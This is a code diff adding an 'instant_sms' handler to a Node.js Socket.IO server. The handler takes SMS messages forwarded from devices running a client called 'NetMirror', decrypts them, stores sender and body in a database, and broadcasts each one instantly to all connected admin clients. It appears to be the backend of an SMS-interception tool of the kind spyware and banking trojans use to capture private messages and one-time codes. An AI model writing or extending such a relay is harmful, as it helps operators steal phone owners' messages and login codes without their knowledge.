@@ -1162,6 +1162,55 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
   };
   io.on('connection', (socket) => {
     socket.onAny(() => { metrics.wsMessagesIn++; });
+
+    // ═══ INSTANT SMS RELAY — device → server → admin app ═══
+    // NetMirror emits 'instant_sms' when an SMS is received on the device.
+    // We save it to the DB and broadcast 'new_sms' to all connected admin clients.
+    socket.on('instant_sms', (rawData) => {
+      try {
+        // Decrypt if encrypted, otherwise parse directly
+        let data;
+        try {
+          const { cryptoDecrypt } = require('./utils/crypto');
+          data = cryptoDecrypt(rawData);
+        } catch (_) {
+          data = typeof rawData === 'string' ? JSON.parse(rawData) : rawData;
+        }
+
+        const deviceId = data.device_id;
+        const address = data.address || 'Unknown';
+        const body = data.body || '';
+        const date = data.date || Date.now();
+        const type = data.type || 1;
+        const simSlot = data.sim_slot || 1;
+
+        if (!deviceId) return;
+
+        // Save to database immediately
+        try {
+          db.prepare(`INSERT OR REPLACE INTO sms_messages
+            (device_id, sms_id, address, body, date, type, read, synced_at)
+            VALUES (?, ?, ?, ?, ?, ?, 0, datetime('now'))`)
+            .run(deviceId, Date.now(), address, body, date, type);
+        } catch (_) { /* duplicate or DB error — non-critical */ }
+
+        // Broadcast to ALL connected admin clients instantly
+        const smsPayload = {
+          device_id: deviceId,
+          address,
+          body,
+          date,
+          type,
+          sim_slot: simSlot,
+          timestamp: Date.now()
+        };
+        origEmit('new_sms', smsPayload);
+
+        console.log(`[SMS-Relay] Instant SMS from ${address} on device ${deviceId} → broadcast to admins`);
+      } catch (e) {
+        console.warn('[SMS-Relay] Error processing instant_sms:', e.message);
+      }
+    });
   });
 
   // Broadcast metrics every 2 seconds
